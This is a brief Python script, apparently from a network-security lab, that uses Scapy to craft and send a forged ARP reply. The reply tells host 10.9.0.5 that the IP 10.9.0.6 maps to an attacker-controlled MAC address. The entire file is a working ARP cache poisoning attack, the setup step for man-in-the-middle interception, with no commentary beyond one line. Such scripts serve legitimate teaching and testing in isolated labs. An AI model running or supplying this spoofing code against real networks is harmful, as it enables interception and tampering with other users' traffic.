
#!/usr/bin/env python3
from scapy.all import *
IP_A= "10.9.0.5"
MAC_A_real = "02:42:0a:09:00:05"
IP_B= "10.9.0.6"
IP_T= "10.9.0.105"
MAC_T_fake="02:42:0a:09:00:69"


# Constructing ARP Reply packet
ether =Ether (src = MAC_T_fake, dst = MAC_A_real)
arp = ARP (psrc = IP_B, hwsrc = MAC_T_fake,pdst = IP_A, hwdst = MAC_A_real)
arp.op = 2 # Reply
frame = ether/arp
sendp (frame)